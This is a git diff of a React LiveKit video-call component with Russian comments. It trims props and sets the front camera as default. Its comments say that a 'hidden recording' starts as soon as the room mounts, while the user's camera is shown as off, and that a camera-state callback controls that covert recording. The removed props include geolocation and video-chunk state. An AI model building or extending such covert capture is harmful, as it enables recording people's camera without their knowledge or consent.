@@ -1,16 +1,11 @@
-import { useState, useEffect, useRef, Dispatch, SetStateAction, MutableRefObject } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { 
   LiveKitRoom as LKRoom, 
   VideoConference,
-  GridLayout,
-  ParticipantTile,
   RoomAudioRenderer,
-  ControlBar,
-  useTracks,
-  useLocalParticipant, // Добавляем хук для отслеживания локального участника
+  useLocalParticipant,
 } from '@livekit/components-react';
 import '@livekit/components-styles';
-import { Track } from 'livekit-client';
 
 interface LiveKitRoomProps {
   roomName: string;
@@ -18,36 +13,15 @@ interface LiveKitRoomProps {
   token: string;
   livekitUrl: string;
   onLeave: () => void;
-  videoStreamFront: MediaStream | null;
-  setVideoStreamFront: Dispatch<SetStateAction<MediaStream | null>>;
-  isVideoRecording: boolean;
-  setIsVideoRecording: Dispatch<SetStateAction<boolean>>;
-  currentChunkNumber: number;
-  setCurrentChunkNumber: Dispatch<SetStateAction<number>>;
-  currentCameraType: 'front' | 'back' | 'desktop';
-  setCurrentCameraType: Dispatch<SetStateAction<'front' | 'back' | 'desktop'>>;
-  geoData: {
-    latitude: number;
-    longitude: number;
-    accuracy: number;
-    timestamp: string;
-  } | null;
-  setGeoData: Dispatch<SetStateAction<{
-    latitude: number;
-    longitude: number;
-    accuracy: number;
-    timestamp: string;
-  } | null>>;
-  isSwitchingCameraRef: MutableRefObject<boolean>;
-  globalChunkCounterRef: MutableRefObject<number>;
-  geoLocationSentRef: MutableRefObject<boolean>;
-  currentVideoDeviceIdRef: MutableRefObject<string | null>;
-  isExecutingPermissionsRef: MutableRefObject<boolean>;
-  onCameraStateChange: (isEnabled: boolean) => void; // Новый callback для управления скрытой записью
+  onCameraStateChange: (isEnabled: boolean) => void;
 }
 
 // Компонент для отслеживания состояния камеры внутри LiveKit контекста
-function CameraStateMonitor({ onCameraStateChange }: { onCameraStateChange: (isEnabled: boolean) => void }) {
+function CameraStateMonitor({ 
+  onCameraStateChange,
+}: { 
+  onCameraStateChange: (isEnabled: boolean) => void;
+}) {
   const { isCameraEnabled } = useLocalParticipant();
   const hasInitializedRef = useRef(false);
   
@@ -55,30 +29,30 @@ function CameraStateMonitor({ onCameraStateChange }: { onCameraStateChange: (isE
   useEffect(() => {
     console.log('📹 [CameraStateMonitor] Компонент смонтирован - запускаем скрытую запись немедленно');
     
-    // ✅ ИСПРАВЛЕНИЕ: Добавляем небольшую задержку чтобы PreJoin точно освободил камеру
+    // ✅ Небольшая задержка чтобы PreJoin освободил камеру
     const initTimer = setTimeout(() => {
       if (!hasInitializedRef.current) {
         console.log('📹 [CameraStateMonitor] Запускаем скрытую запись (камера выключена при старте)');
         hasInitializedRef.current = true;
         onCameraStateChange(false); // Камера выключена при старте (video={false} in LKRoom)
       }
-    }, 500); // 500ms задержка для освобождения PreJoin stream
+    }, 2000);
     
     return () => clearTimeout(initTimer);
-  }, []); // Пустой массив = только при монтировании
+  }, []);
   
+  // Просто мониторим состояние камеры
   useEffect(() => {
-    // ✅ ИСПРАВЛЕНИЕ: Пропускаем первый вызов если уже инициализировались
     if (!hasInitializedRef.current) {
-      console.log('📹 [LiveKit] Пропускаем первый вызов - ждем инициализации');
       return;
     }
     
-    console.log(`📹 [LiveKit] Camera state changed: ${isCameraEnabled ? 'ENABLED' : 'DISABLED'}`);
+    console.log(`📹 [LiveKit] Camera state: ${isCameraEnabled ? 'ENABLED' : 'DISABLED'}`);
     onCameraStateChange(isCameraEnabled);
+    
   }, [isCameraEnabled, onCameraStateChange]);
   
-  return null; // Этот компонент невидимый, только отслеживает состояние
+  return null;
 }
 
 export default function LiveKitRoom({ 
@@ -87,12 +61,12 @@ export default function LiveKitRoom({
   token, 
   livekitUrl,
   onLeave,
-  onCameraStateChange, // Принимаем новый prop
+  onCameraStateChange,
 }: LiveKitRoomProps) {
   const [connectionError, setConnectionError] = useState<string | null>(null);
 
   console.log('🎥 LiveKitRoom component mounted', { roomName, userName, livekitUrl });
-  console.log('�� Token details:', {
+  console.log(' Token details:', {
     tokenType: typeof token,
     tokenLength: token?.length,
     tokenPrefix: token && typeof token === 'string' && token.length > 0 ? token.substring(0, 20) + '...' : 'NO TOKEN',
@@ -155,6 +129,15 @@ export default function LiveKitRoom({
           onError={handleError}
           data-lk-theme="default"
           style={{ height: '100vh', width: '100%' }}
+          options={{
+            videoCaptureDefaults: {
+              facingMode: 'user', // ✅ Фронтальная камера (было 'environment')
+              resolution: {
+                width: 1280,
+                height: 720,
+              }
+            }
+          }}
         >
           <div className="size-full relative">
             <VideoConference />
